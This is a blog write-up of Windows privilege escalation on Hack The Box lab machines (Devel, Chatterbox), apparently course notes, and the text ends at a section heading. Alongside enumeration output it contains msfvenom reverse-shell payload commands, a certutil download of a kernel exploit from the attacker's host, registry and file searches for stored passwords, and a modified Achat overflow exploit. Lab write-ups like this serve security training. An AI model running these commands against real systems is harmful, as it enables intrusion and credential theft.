---
title: Windows PrivEsc 
author: siresire
date: 2024-04-01 9:10:00 +0800
categories: [TryHackMe]
tags: [TCM,Windows,CVE]
render_with_liquid: false
---

## Resources for this blog

1. Fuzzy Security Guide [🔗](https://fuzzysecurity.com/tutorials/16.html)
2. PayloadsAllTheThings Guide [🔗](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
3. Absolomb Windows Privilege Escalation Guide  [🔗](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
4. Sushant 747's Guide (Country dependant - may need VPN) [🔗](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)
5. course repo [🔗](https://github.com/Gr1mmie/Windows-Priviledge-Escalation-Resources)



# Gaining a Foothold
## Introduction(HacktheBox Devel Machine)
### Nmap scan 

```yaml
┌──(root㉿kali)-[/home/…/Documents/CTFs/HackTheBox/Devel]
└─# nmap -vv -sV -A -oN nmap.scans 10.10.10.5 -T4 | grep open  
Discovered open port 80/tcp on 10.10.10.5
Discovered open port 21/tcp on 10.10.10.5
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
```

2 ports are open under 10,000 ports

### port 80 http
```bash
|_  SYST: Windows_NT
PORT   STATE SERVICE REASON          VERSION
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port

```
- The machine seems to be a windows machine with default IIS CMS

![Alt text](/assets/img/htb/devel/dev_001.png)

with directory scan there was 

```bash
┌──(sire㉿kali)-[~/Documents/CTFs/HackTheBox/Devel]
└─$ cat web.directories.logs | grep 200
200      GET      826l     4457w   331772c http://10.10.10.5/welcome.png
200      GET       32l       53w      689c http://10.10.10.5/
```

### port 21 FTP server
```bash
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
```
there was anonymous login and there were the shares 
Trying to trasnfer a file from my machine to be box, it was successful and you could access it in the webpage 

```bash
ftp> put hacked.txt 
local: hacked.txt remote: hacked.txt
229 Entering Extended Passive Mode (|||49209|)
125 Data connection already open; Transfer starting.
100% |**********************************************************************************************|    19       19.63 KiB/s    --:-- ETA
226 Transfer complete.
19 bytes sent in 00:00 (0.08 KiB/s)
ftp> 

```
![Alt text](/assets/img/htb/devel/dev_002.png)

## Gaining a Foothold (Box 1)

After creating a `aspx` file and uploading it using the command 

```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.108 LPORT=4444 -f aspx >reverse.aspx

```
I was able to upload it and got a revese shell using msfcosole
![Alt text](/assets/img/htb/devel/dev_003.png)


# Initial Enumeration
## System Enumeration

Cheking system all system information
```yaml
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          1/4/2024, 1:06:18 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.419 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.500 MB
Virtual Memory: In Use:    641 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) PRO/1000 MT Network Connection
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::b0c6:58be:23f:44b2
                                 [03]: dead:beef::250d:3d57:9984:d293
                                 [04]: dead:beef::b0c6:58be:23f:44b2

c:\windows\system32\inetsrv>

```
To filter system info on a few things
`systeminfo | findstr /b /c:"OS Name" /c:"OS Versoin" /c:"System Type"`

```bash
c:\windows\system32\inetsrv>systeminfo | findstr /b /c:"OS Name" /c:"OS Version" /c:"System Type"
systeminfo | findstr /b /c:"OS Name" /c:"OS Version" /c:"System Type"
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
System Type:               X86-based PC

```

To see all the  patches that have been made ever since we use the command 
`wmic qfe` - a framework for managing data and operations on a Windows computer.

![Alt text](/assets/img/htb/devel/dev_004.png)

To narrow down the list of columns in the table we can use the command `wmic qfe Caption,Description,HotFixID,InstalledOn`
![Alt text](/assets/img/htb/devel/dev_005.png)

To list out the drives available we can use the command `wmic list logicaldrives`
```bash
c:\windows\system32\inetsrv>wmic logical disk
wmic logical disk
logical - Alias not found.

c:\windows\system32\inetsrv>wmic logicaldisk
wmic logicaldisk
Access  Availability  BlockSize  Caption  Compressed  ConfigManagerErrorCode  ConfigManagerUserConfig  CreationClassName  Description       DeviceID  DriveType  ErrorCleared  ErrorDescription  ErrorMethodology  FileSystem  FreeSpace   InstallDate  LastErrorCode  MaximumComponentLength  MediaType  Name  NumberOfBlocks  PNPDeviceID  PowerManagementCapabilities  PowerManagementSupported  ProviderName  Purpose  QuotasDisabled  QuotasIncomplete  QuotasRebuilding  Size         Status  StatusInfo  SupportsDiskQuotas  SupportsFileBasedCompression  SystemCreationClassName  SystemName  VolumeDirty  VolumeName  VolumeSerialNumber  
0                                C:       FALSE                                                        Win32_LogicalDisk  Local Fixed Disk  C:        3                                                            NTFS        4653944832                              255                     12         C:                                                                                                                                                                   13852733440                      FALSE               TRUE                          Win32_ComputerSystem     DEVEL                                137F3971            

```
but the above is soo messy  but to clean the whole thing we can use the command `wmic logicaldisk get caption,description,providername`

```bash
c:\windows\system32\inetsrv>wmic logicaldisk get caption,description,providername
wmic logicaldisk get caption,description,providername
Caption  Description       ProviderName  
C:       Local Fixed Disk                

```

## User Enumeration 
With the command `whoami` we can see the we are not system user
```bash
c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web

```

Checking our privileges wiht the command `whoami /priv`

```yaml
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeShutdownPrivilege           Shut down the system                      Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled

```

Checking on the groups `whoami /groups`

```yaml
c:\windows\system32\inetsrv>whoami /groups
whoami /groups
GROUP INFORMATION
-----------------
Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
```

we are not part of any group as for now 

Checking users on the machine using the command `net users`
```bash
c:\windows\system32\inetsrv>net users
net users

User accounts for \\
-------------------------------------------------------------------------------
Administrator            babis                    Guest                    
The command completed with one or more errors.
```
As you can see we are no a service account IIS , not a user account 

Checking specific users on the machine using the command `net <username>`

```yaml
c:\windows\system32\inetsrv>net users
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            babis                    Guest                    
c:\windows\system32\inetsrv>net user babis
net user babis
User name                    babis
Full Name                    
Comment                      
User's comment               
Country code                 000 (System Default)
Account active               Yes
Account expires              Never

Password last set            18/3/2017 2:15:19 ��
Password expires             Never
Password changeable          18/3/2017 2:15:19 ��
Password required            No
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   18/3/2017 2:17:50 ��

Logon hours allowed          All

Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.

```

Checking local groups using the command `net localgroup`

```bash
c:\windows\system32\inetsrv>net localgroup Administrators
net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.

```

## Network Enumeration
Checking the machines ip address with other network with the `\all` parameter we can see more information such as the gate way , dns , newtwork architecture and even the domain name if it's there

```yaml
c:\windows\system32\inetsrv>ipconfig /all
ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : devel
   Primary Dns Suffix  . . . . . . . : 
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No

Ethernet adapter Local Area Connection 4:

   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
   Physical Address. . . . . . . . . : 00-50-56-B9-6B-79
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::b0c6:58be:23f:44b2(Preferred) 
   Temporary IPv6 Address. . . . . . : dead:beef::250d:3d57:9984:d293(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::b0c6:58be:23f:44b2%15(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.10.10.5(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:eec2%15
                                       10.10.10.2
   DNS Servers . . . . . . . . . . . : 8.8.8.8
                                       1.1.1.1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Tunnel adapter isatap.{0B2931D6-69F8-4A00-8E64-237C531D469C}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : 
   Description . . . . . . . . . . . : Microsoft ISATAP Adapter
   Physical Address. . . . . . . . . : 00-00-00-00-00-00-00-E0
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
```

Also you can see the arp table with the command `arp - at`
```yaml
c:\windows\system32\inetsrv>arp -a
arp -a

Interface: 10.10.10.5 --- 0xf
  Internet Address      Physical Address      Type
  10.10.10.2            00-50-56-b9-ee-c2     dynamic   
  10.10.11.255          ff-ff-ff-ff-ff-ff     static    
  224.0.0.22            01-00-5e-00-00-16     static    
  224.0.0.252           01-00-5e-00-00-fc     static
```

and the routing table where the machine is communicating as well with the command `route print`
```yaml
c:\windows\system32\inetsrv>route print
route print
===========================================================================
Interface List
 15...00 50 56 b9 6b 79 ......Intel(R) PRO/1000 MT Network Connection
  1...........................Software Loopback Interface 1
 14...00 00 00 00 00 00 00 e0 Microsoft ISATAP Adapter
===========================================================================

IPv4 Route Table
===========================================================================
Active Routes:
Network Destination        Netmask          Gateway       Interface  Metric
          0.0.0.0          0.0.0.0       10.10.10.2       10.10.10.5    266
       10.10.10.0    255.255.254.0         On-link        10.10.10.5    266
       10.10.10.5  255.255.255.255         On-link        10.10.10.5    266
     10.10.11.255  255.255.255.255         On-link        10.10.10.5    266
        127.0.0.0        255.0.0.0         On-link         127.0.0.1    306
        127.0.0.1  255.255.255.255         On-link         127.0.0.1    306
  127.255.255.255  255.255.255.255         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link         127.0.0.1    306
        224.0.0.0        240.0.0.0         On-link        10.10.10.5    266
  255.255.255.255  255.255.255.255         On-link         127.0.0.1    306
  255.255.255.255  255.255.255.255         On-link        10.10.10.5    266
===========================================================================
Persistent Routes:
  Network Address          Netmask  Gateway Address  Metric
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
          0.0.0.0          0.0.0.0       10.10.10.2  Default 
===========================================================================

IPv6 Route Table
===========================================================================
Active Routes:
 If Metric Network Destination      Gateway
 15    266 ::/0                     fe80::250:56ff:feb9:eec2
  1    306 ::1/128                  On-link
 15     18 dead:beef::/64           On-link
 15    266 dead:beef::250d:3d57:9984:d293/128
                                    On-link
 15    266 dead:beef::b0c6:58be:23f:44b2/128
                                    On-link
 15    266 fe80::/64                On-link
 15    266 fe80::b0c6:58be:23f:44b2/128
                                    On-link
  1    306 ff00::/8                 On-link
 15    266 ff00::/8                 On-link
===========================================================================
Persistent Routes:
  None

```

Another tool that we can use for networking is `netstat` to chech open ports and services that are running locally

![Alt text](/assets/img/htb/devel/dev_006.png)

## Password Hunting
Search for them

```bash
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

#Find all those strings in config files.
dir /s *pass* == *cred* == *vnc* == *.config*

# Find all passwords in all files.
findstr /spin "password" *.*
findstr /spin "password" *.*
```
In Files
These are common files to find them in. They might be base64-encoded. So look out for that.

```bash
c:\sysprep.inf
c:\sysprep\sysprep.xml
c:\unattend.xml
%WINDIR%\Panther\Unattend\Unattended.xml
%WINDIR%\Panther\Unattended.xml

dir c:\*vnc.ini /s /b
dir c:\*ultravnc.ini /s /b 
dir c:\ /s /b | findstr /si *vnc.ini

```

In Registry
```bash
# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# SNMP Paramters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```

## AV Enumeration

Firewall and anti-virus configuration files

we use the command `sc` for service control to query service that are running on the machine
i.e windefend `sc query windefend`
![Alt text](/assets/img/htb/devel/dev_007.png)

and as you can see, windows defender is on 

or use the command `sc queryex type= service` to query service that are running on the machine

```bash
c:\windows\system32\inetsrv>sc queryex type= service
sc queryex type= service

SERVICE_NAME: Dhcp
DISPLAY_NAME: DHCP Client
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 764
        FLAGS              : 

SERVICE_NAME: Dnscache
DISPLAY_NAME: DNS Client
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1088
        FLAGS              : 

SERVICE_NAME: eventlog
DISPLAY_NAME: Windows Event Log
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 764
        FLAGS              : 

SERVICE_NAME: ftpsvc
DISPLAY_NAME: Microsoft FTP Service
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1404
        FLAGS              : 

SERVICE_NAME: MpsSvc
DISPLAY_NAME: Windows Firewall
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1224
        FLAGS              : 

SERVICE_NAME: Power
DISPLAY_NAME: Power
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 608
        FLAGS              : 

SERVICE_NAME: RpcSs
DISPLAY_NAME: Remote Procedure Call (RPC)
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 684
        FLAGS              : 

SERVICE_NAME: Schedule
DISPLAY_NAME: Task Scheduler
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 880
        FLAGS              : 

SERVICE_NAME: Spooler
DISPLAY_NAME: Print Spooler
        TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1188
        FLAGS              : 

SERVICE_NAME: VMTools
DISPLAY_NAME: VMware Tools
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 1544
        FLAGS              : 

SERVICE_NAME: WinDefend
DISPLAY_NAME: Windows Defender
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 2836
        FLAGS              : 

SERVICE_NAME: wscsvc
DISPLAY_NAME: Security Center
        TYPE               : 20  WIN32_SHARE_PROCESS  
        STATE              : 4  RUNNING 
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
        PID                : 764
        FLAGS              : 



etc ....
```

To check the status of firewall we use the command `netsh firewall show status`

```bash
c:\windows\system32\inetsrv>netsh firewall show state
netsh firewall show state

Firewall status:
-------------------------------------------------------------------
Profile                           = Standard
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable
Group policy version              = Windows Firewall
Remote admin mode                 = Disable

Ports currently open on all network interfaces:
Port   Protocol  Version  Program
-------------------------------------------------------------------
No ports are currently open on all network interfaces.

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .

```

and to show the configuration of the firewall we use the command `netsh firewall show config`

```bash
c:\windows\system32\inetsrv>netsh firewall --config
netsh firewall --config
The following command was not found: firewall --config.

c:\windows\system32\inetsrv>netsh firewall show config
netsh firewall show config

Domain profile configuration:
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Allowed programs configuration for Domain profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Domain profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------

ICMP configuration for Domain profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Standard profile configuration (current):
-------------------------------------------------------------------
Operational mode                  = Enable
Exception mode                    = Enable
Multicast/broadcast response mode = Enable
Notification mode                 = Enable

Service configuration for Standard profile:
Mode     Customized  Name
-------------------------------------------------------------------
Enable   No          File and Printer Sharing
Enable   No          Network Discovery

Allowed programs configuration for Standard profile:
Mode     Traffic direction    Name / Program
-------------------------------------------------------------------

Port configuration for Standard profile:
Port   Protocol  Mode    Traffic direction     Name
-------------------------------------------------------------------

ICMP configuration for Standard profile:
Mode     Type  Description
-------------------------------------------------------------------
Enable   2     Allow outbound packet too big

Log configuration:
-------------------------------------------------------------------
File location   = C:\Windows\system32\LogFiles\Firewall\pfirewall.log
Max file size   = 4096 KB
Dropped packets = Disable
Connections     = Disable

IMPORTANT: Command executed successfully.
However, "netsh firewall" is deprecated;
use "netsh advfirewall firewall" instead.
For more information on using "netsh advfirewall firewall" commands
instead of "netsh firewall", see KB article 947709
at http://go.microsoft.com/fwlink/?linkid=121488 .
```

# Exploring Automated Tools
## Automated Tool Overview

Resources

- [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

- [Windows PrivEsc Checklist](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)

- [Sherlock](https://github.com/rasta-mouse/Sherlock)

- [Watson](https://github.com/rasta-mouse/Watson)

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)

- [JAWS](https://github.com/411Hall/JAWS)

- [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

- [Metasploit Local Exploit Suggester](https://blog.rapid7.com/2015/08/11/metasploit-local-exploit-suggester-do-less-get-more/)

- [Seatbelt](https://github.com/GhostPack/Seatbelt)

- [SharpUp](https://github.com/GhostPack/SharpUp)

![Alt text](/assets/img/htb/devel/dev_008.png)


# Escalation Path: Kernel Exploits
## Kernel Exploits Overview
[source](https://github.com/SecWiki/windows-kernel-exploits)

![Alt text](/assets/img/htb/devel/dev_009.png)

![Alt text](/assets/img/htb/devel/dev_010.png)

## Escalation with Metasploit

After running the command `post/multi/recon/local_exploit_suggester` when you have a session, the command will suggest potential local exploits that could be used to escalate privileges on the compromised system.

![Alt text](/assets/img/htb/devel/dev_011.png)

Checking online on the `ms10_015` Kernel we found that this module will create a new session with SYSTEM privileges via the KiTrap0D exlpoit by Tavis Ormandy [MS10-015](https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS10-015/README.md)

![Alt text](/assets/img/htb/devel/dev_012.png)

After setting all the options that are required, we run the explit but did not have a shell back

```yaml
msf6 exploit(windows/local/ms10_015_kitrap0d) > run

[*] Started reverse TCP handler on 192.168.64.6:4444 
[*] Reflectively injecting payload and triggering the bug...
[*] Launching netsh to host the DLL...
[+] Process 3736 launched.
[*] Reflectively injecting the DLL into 3736...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/local/ms10_015_kitrap0d) > sessions

Active sessions
===============

  Id  Name  Type                     Information              Connection
  --  ----  ----                     -----------              ----------
  2         meterpreter x86/windows  IIS APPPOOL\Web @ DEVEL  10.10.14.15:4444 -> 10.10.10.5:49170 (10.10.10.5)


```

This was due to the fact that I did not change the lhost and the lport and after changing them , we had a session open as administrator

![Alt text](/assets/img/htb/devel/dev_013.png)

## Manual Kernel Exploitation

first thing to do , I created a reverse shell payload with meterpreter using the following command
`msfvenom -p windows/shell_reverse_tcp HLOST=localhost LPORT=9001 -f aspx > ncat.aspx`

And then I ftp the payload to the server ,set up a listner on port 9001 and with curl, I got a shell back

![Alt text](/assets/img/htb/devel/dev_014.png)

Exploiting it to administrator privileges

after running windows exploit sugester , I got this 2 Kernel exploit to admin privileges

![Alt text](/assets/img/htb/devel/dev_015.png)

After googling I came accross this exploit to admin privileges

![Alt text](/assets/img/htb/devel/dev_016.png)

I downloaded the .exe file from github [MS10-059 Exploit](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059)

After downloading, I transferred the .exe to the Windows machine using the command 
`certutil -urlcache -f http://10.10.14.15/MS10-059.exe MS10-059.exe `

ran the exploit 

![Alt text](/assets/img/htb/devel/dev_017.png)

and got `nt authority\system`

![Alt text](/assets/img/htb/devel/dev_018.png)


# Escalation Path: Passwords and Port Forwarding 
## Gaining a Foothold (Box 2)
With the nmap scan , there was a port that was intresting `9256` which was running sercice achat

searching on `searchsploit we had one that was for python` which was a `CVE-2015-1577`
![Alt text](/assets/img/htb/devel/dev_019.png)

so added some modifications to the command 
```python
# msfvenom -a x86 --platform Windows -p windows/exec CMD=calc.exe -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

`msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=4001 -e x86/unicode_mixed ................`

I replaced the payload with the payload that I generated and set up a listener on port 4001

and also changed the server_address 
```python
# Create a UDP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_address = ('10.10.10.74', 9256)
```

and I got a shell as a low privileged user

![Alt text](/assets/img/htb/devel/dev_020.png)

[Achat Exploit](https://www.exploit-db.com/exploits/36025)

## Escalation via Stored Passwords